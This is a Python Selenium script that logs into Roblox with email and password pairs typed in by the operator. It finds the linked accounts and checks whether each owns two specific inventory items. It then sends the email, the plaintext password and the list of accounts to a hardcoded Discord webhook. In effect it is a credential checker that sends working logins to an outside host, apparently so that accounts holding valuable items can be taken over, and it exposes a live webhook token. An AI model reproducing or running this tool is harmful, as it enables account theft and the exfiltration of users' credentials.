import os, time, requests
from datetime import datetime
from colorama import init, Fore
from selenium import webdriver  # type: ignore
from selenium.webdriver.firefox.service import Service  # type: ignore
from selenium.webdriver.common.by import By  # type: ignore
from selenium.webdriver.firefox.options import Options  # type: ignore
from selenium.webdriver.support.ui import WebDriverWait  # type: ignore
from selenium.webdriver.support import expected_conditions as EC  # type: ignore
from selenium.common.exceptions import ElementClickInterceptedException  # type: ignore

init(autoreset=True)

os.system('cls' if os.name == 'nt' else 'clear')
os.system('title Let me see your feet 🦶')

options = Options()
options.headless = True

firefox_binary_path = r"C:\Program Files\Mozilla Firefox\firefox.exe"
options.binary_location = firefox_binary_path
geckodriver_path = r"geckodriver-v0.35.0-win32\geckodriver.exe"

service = Service(executable_path=geckodriver_path)
driver = webdriver.Firefox(service=service, options=options)

def solve_captcha(driver):
    print(f"{Fore.CYAN}[ CAPTCHA ] Checking for CAPTCHA")
    try:
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, 'arkose-iframe')))
        print(f"{Fore.CYAN}[ CAPTCHA ] CAPTCHA detected")
        WebDriverWait(driver, 300).until_not(EC.presence_of_element_located((By.ID, 'arkose-iframe')))
        print(f"{Fore.CYAN}[ CAPTCHA ] CAPTCHA solved")
    except Exception as e:
        print(f"{Fore.CYAN}[ CAPTCHA ] No CAPTCHA detected or it has already been solved")

while True:
    email = input(f"{Fore.BLUE}Email -> ")
    password = input(f"{Fore.BLUE}Password -> ")

    driver.get("https://www.roblox.com/login")

    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))

    email_field = driver.find_element(By.NAME, "username")
    password_field = driver.find_element(By.NAME, "password")

    email_field.send_keys(email)
    password_field.send_keys(password)

    try:
        login_button = driver.find_element(By.XPATH, '//button[contains(@class, "login-button")]')
        WebDriverWait(driver, 10).until(EC.element_to_be_clickable(login_button))
        login_button.click()
    except ElementClickInterceptedException:
        WebDriverWait(driver, 5).until(EC.invisibility_of_element_located((By.CLASS_NAME, "account-selection-name-container")))
        login_button.click()

    solve_captcha(driver)

    try:
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, 'login-form-error')))
        error_message = driver.find_element(By.ID, 'login-form-error').text
        if "Incorrect username or password" in error_message:
            print(f"{Fore.RED}[ INCORRECT ] {email}:{password}")
            retry = input(f"{Fore.BLUE}Check another? (y/n) -> ")
            if retry.lower() != 'y':
                break
            continue
    except Exception:
        print(f"{Fore.GREEN}[ LOGIN ] Logged in")

    try:
        WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.CLASS_NAME, "account-selection-username")))

        usernames = driver.find_elements(By.CLASS_NAME, "account-selection-username")
        if usernames:
            usernames_list = [username.text.replace('@', '') for username in usernames]

            url = "https://users.roblox.com/v1/usernames/users"
            headers = {"Content-Type": "application/json"}
            data = {"usernames": usernames_list, "excludeBannedUsers": True}

            response = requests.post(url, json=data, headers=headers)

            if response.status_code == 200:
                user_data = response.json().get("data", [])
                user_list = []

                for user in user_data:
                    username = user.get("requestedUsername")
                    user_id = user.get("id")
                    if username and user_id:
                        time.sleep(0.5)
                        print(f"{Fore.MAGENTA}[ CHECKING ] {username}:{user_id}")

                        hat_item_id = 102611803
                        sign_item_id = 1567446

                        hat_url = f"https://inventory.roblox.com/v1/users/{user_id}/items/0/{hat_item_id}/is-owned"
                        sign_url = f"https://inventory.roblox.com/v1/users/{user_id}/items/0/{sign_item_id}/is-owned"

                        try:
                            hat_response = requests.get(hat_url, headers={"accept": "application/json"})
                            sign_response = requests.get(sign_url, headers={"accept": "application/json"})

                            hat_owned = hat_response.json()
                            sign_owned = sign_response.json()

                            if hat_owned or sign_owned:
                                item_status = []
                                if hat_owned:
                                    item_status.append("Hat")
                                if sign_owned:
                                    item_status.append("Sign")
                            else:
                                item_status = ["None"]

                            user_list.append(f"{username}:{user_id}:{'/'.join(item_status)}")
                        except requests.exceptions.RequestException as e:
                            print(f"{Fore.RED}[ ERROR ] Couldnt get item ownership data: {e}")

                        time.sleep(1)

                webhook_url = 'https://discord.com/api/webhooks/1301366782212182046/OHgIVoDVja2oy2reIGy-nry-BjQ-KaoGdKkkZsmtqDmn2GBsfU4hwsp4c29JUsO0H1Fy'
                embed = {
                    "embeds": [
                        {
                            "title": f"Accounts checked for {email}",
                            "thumbnail": {
                                "url": "https://i.ibb.co/rygNbQz/888f2890abc292062ca4ab455dfd8a66.png"
                            },
                            "description": f"**Total Accounts:** {len(usernames)}\n**Email:** `{email}`\n**Password:** `{password}`\n\n**Accounts**\n" + "\n".join(user_list),
                            "color": 16777215,
                            "footer": {
                            "text": "This is owned by mythical/mausa 🦶"
                            },
                            "timestamp": datetime.now().isoformat()
                        }
                    ]
                }

                requests.post(webhook_url, json=embed)
                print(f"{Fore.GREEN}[ WEBHOOK ] Sent to webhook")
            else:
                print(f"{Fore.RED}[ ERROR ] {response.status_code}")
        else:
            print(f"{Fore.RED}[ MODAL ] No modal found")
    except Exception as e:
        print(f"{Fore.RED}[ ERROR ] Could not detect modal or usernames: {e}")

    continue_check = input(f"{Fore.BLUE}Check another? (y/n) -> ")
    if continue_check.lower() != 'y':
        break

driver.quit()
